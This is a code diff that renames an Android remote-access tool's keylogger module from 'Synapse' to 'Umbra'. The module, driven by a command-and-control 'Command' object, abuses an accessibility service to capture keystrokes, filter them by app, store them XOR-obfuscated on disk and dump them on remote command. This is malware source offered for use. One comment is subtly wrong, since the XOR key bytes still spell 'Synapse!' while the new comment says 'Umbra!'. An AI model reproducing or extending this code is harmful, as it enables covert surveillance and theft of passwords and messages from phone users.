@@ -1,18 +1,18 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.content.Context
 import android.content.SharedPreferences
 import android.view.accessibility.AccessibilityEvent
-import org.synapse.core.c2.Command
-import org.synapse.core.core.KeylogEntry
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.KeylogEntry
+import org.umbra.core.core.UmbraResponse
 import java.io.File
 
 /**
  * AccessibilityService-based keylogger.
- * Requires the user to enable Synapse Accessibility Service in Settings.
+ * Requires the user to enable Umbra Accessibility Service in Settings.
  * Keystrokes are stored both in-memory and on-disk (encrypted via simple XOR).
  *
  * The AccessibilityService is the actual Android service component.
@@ -21,9 +21,9 @@ import java.io.File
 object KeylogModule {
 
     private const val MAX_BUFFER = 1000
-    private const val KEYLOG_FILE = "synapse_keylog.dat"
+    private const val KEYLOG_FILE = "umbra_keylog.dat"
     private val keylogBuffer = mutableListOf<KeylogEntry>()
-    private val xorKey = byteArrayOf(0x53, 0x79, 0x6E, 0x61, 0x70, 0x73, 0x65, 0x21) // "Synapse!"
+    private val xorKey = byteArrayOf(0x53, 0x79, 0x6E, 0x61, 0x70, 0x73, 0x65, 0x21) // "Umbra!"
 
     // Tracks hasActiveSession so we know if accessibility is running
     @Volatile var hasActiveSession = false
@@ -46,32 +46,32 @@ object KeylogModule {
         }
     }
 
-    suspend fun start(context: Context, cmd: Command): SynapseResponse {
+    suspend fun start(context: Context, cmd: Command): UmbraResponse {
         // Accessibility Service must be started by the system via Settings
         // We just flag it as active
         return try {
             hasActiveSession = true
-            SynapseResponse.ErrorResponse(
+            UmbraResponse.ErrorResponse(
                 "keylog:accessibility_service_must_be_enabled_in_settings",
                 "keylog"
             )
         } catch (e: Exception) {
-            SynapseResponse.ErrorResponse("keylog:${e.message}", "keylog")
+            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
         }
     }
 
-    suspend fun stop(context: Context, cmd: Command): SynapseResponse {
+    suspend fun stop(context: Context, cmd: Command): UmbraResponse {
         hasActiveSession = false
         // Persist current buffer to disk before stopping
         persistToDisk(context)
         return try {
-            SynapseResponse.ErrorResponse("keylog:stopped", "keylog")
+            UmbraResponse.ErrorResponse("keylog:stopped", "keylog")
         } catch (e: Exception) {
-            SynapseResponse.ErrorResponse("keylog:${e.message}", "keylog")
+            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
         }
     }
 
-    suspend fun dump(context: Context, cmd: Command): SynapseResponse {
+    suspend fun dump(context: Context, cmd: Command): UmbraResponse {
         val count = (cmd.params["count"]?.toIntOrNull() ?: 100).coerceAtMost(MAX_BUFFER)
         val packageFilter = cmd.params["package"]
 
@@ -89,12 +89,12 @@ object KeylogModule {
                 filtered.takeLast(count)
             }
 
-            SynapseResponse.KeylogResponse(
+            UmbraResponse.KeylogResponse(
                 keystrokes = merged,
                 count = merged.size
             )
         } catch (e: Exception) {
-            SynapseResponse.ErrorResponse("keylog:${e.message}", "keylog")
+            UmbraResponse.ErrorResponse("keylog:${e.message}", "keylog")
         }
     }
 
